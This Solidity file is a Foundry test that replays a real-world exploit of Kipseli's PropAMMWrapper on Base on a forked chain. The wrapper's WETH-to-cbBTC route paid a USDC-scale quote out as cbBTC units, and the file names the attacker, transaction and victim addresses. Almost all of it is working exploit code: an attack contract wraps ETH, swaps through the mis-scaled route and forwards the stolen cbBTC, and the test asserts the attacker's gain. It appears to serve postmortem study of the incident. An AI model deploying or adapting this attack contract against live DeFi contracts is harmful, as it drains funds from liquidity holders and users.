// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 0.93 cbBTC
// Attacker : 0x2352a1fca90182509dca9c12b2cad582a38e8b82
// Attack Contract : 0x74513519689b1fb427747624a4dd87b3849d39cd
// Vulnerable Contract : 0xd35c6717cca1e04696b694dcb1643ac3620d2152
// Attack Tx : https://basescan.org/tx/0x96edeeb3d49d7a54c60d227bedce5bf64df5d52effd9fd80334175a9553db3bb

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xd35c6717cca1e04696b694dcb1643ac3620d2152#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2046873857571934254
//
// Kipseli's PropAMM route accepted WETH -> cbBTC and produced a USDC-scale quote. The returned integer
// was transferred as cbBTC units, turning a roughly 92 USDC quote into about 0.926 cbBTC.

address constant ATTACKER = 0x2352a1FcA90182509dCa9c12B2CAd582a38E8b82;
address constant PROP_AMM_WRAPPER = 0xd35C6717cCa1E04696B694DCb1643Ac3620D2152;
address constant CBBTC_HOLDER = 0xBEE3211ab312a8D065c4FeF0247448e17A8da000;
IWETH constant WETH_TOKEN = IWETH(payable(0x4200000000000000000000000000000000000006));
IERC20 constant CBBTC_TOKEN = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);

interface IPropAMMWrapper {
    function quote(
        address tokenIn,
        uint256 amountIn,
        address tokenOut
    ) external view returns (uint256 amountOut);
    function swap(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 minOutAmount,
        address recipient
    ) external returns (uint256 amountOut);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 45_008_654;
        vm.createSelectFork("base", forkBlock);
        vm.roll(45_008_655);
        vm.warp(1_776_806_657);

        fundingToken = address(CBBTC_TOKEN);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker / profit receiver");
        vm.label(PROP_AMM_WRAPPER, "Kipseli PropAMMWrapper");
        vm.label(CBBTC_HOLDER, "Kipseli cbBTC holder");
        vm.label(address(WETH_TOKEN), "WETH");
        vm.label(address(CBBTC_TOKEN), "cbBTC");
    }

    function testExploit() public balanceLog {
        uint256 amountIn = 0.04 ether;
        uint256 minimumImpact = 90_000_000; // 0.9 cbBTC, using cbBTC's 8 decimals.
        uint256 attackerBefore = CBBTC_TOKEN.balanceOf(ATTACKER);
        uint256 holderBefore = CBBTC_TOKEN.balanceOf(CBBTC_HOLDER);

        KipseliAttack localAttack =
            new KipseliAttack(PROP_AMM_WRAPPER, address(WETH_TOKEN), address(CBBTC_TOKEN), ATTACKER);
        vm.label(address(localAttack), "Local attack contract");

        // step 1: fund the local attack contract through the historical profit receiver.
        deal(ATTACKER, amountIn);
        vm.prank(ATTACKER, ATTACKER);
        (uint256 quotedAmount, uint256 receivedAmount) = localAttack.run{value: amountIn}();

        // step 2: prove the quote is USDC-scale, then prove it was received as cbBTC units.
        assertGt(quotedAmount, minimumImpact, "quote was not in the exploitable scale");
        assertGt(receivedAmount, minimumImpact, "attacker did not receive cbBTC-scale output");

        // step 3: preserve the observed final forwarding path from attack contract to attacker.
        uint256 attackerGain = CBBTC_TOKEN.balanceOf(ATTACKER) - attackerBefore;
        assertEq(attackerGain, receivedAmount, "local attack did not forward cbBTC to attacker");

        // step 4: prove impact against the same cbBTC holder that funded the receipt transfer.
        uint256 holderLoss = holderBefore - CBBTC_TOKEN.balanceOf(CBBTC_HOLDER);
        assertEq(holderLoss, receivedAmount, "cbBTC holder loss did not match attacker gain");
        emit log_named_decimal_uint("cbBTC gained through decimal mismatch", attackerGain, 8);
    }
}

contract KipseliAttack {
    IPropAMMWrapper private immutable wrapper;
    IWETH private immutable weth;
    IERC20 private immutable cbbtc;
    address private immutable receiver;

    constructor(
        address wrapper_,
        address weth_,
        address cbbtc_,
        address receiver_
    ) {
        wrapper = IPropAMMWrapper(wrapper_);
        weth = IWETH(payable(weth_));
        cbbtc = IERC20(cbbtc_);
        receiver = receiver_;
    }

    function run() external payable returns (uint256 quotedAmount, uint256 receivedAmount) {
        uint256 amountIn = msg.value;

        // step 1: mirror the historical attack contract wrapping ETH into WETH.
        weth.deposit{value: amountIn}();
        require(weth.approve(address(wrapper), amountIn), "approve failed");

        // step 2: use the verified wrapper ABI instead of raw attacker calldata.
        quotedAmount = wrapper.quote(address(weth), amountIn, address(cbbtc));
        uint256 minOutAmount = 1; // Historical tx input set the wrapper swap minimum to one token unit.
        uint256 beforeBalance = cbbtc.balanceOf(address(this));
        wrapper.swap(address(weth), amountIn, address(cbbtc), minOutAmount, address(this));
        receivedAmount = cbbtc.balanceOf(address(this)) - beforeBalance;

        // step 3: forward profit to the historical tx sender / final receiver.
        require(cbbtc.transfer(receiver, receivedAmount), "cbBTC transfer failed");
    }

    receive() external payable {}
}
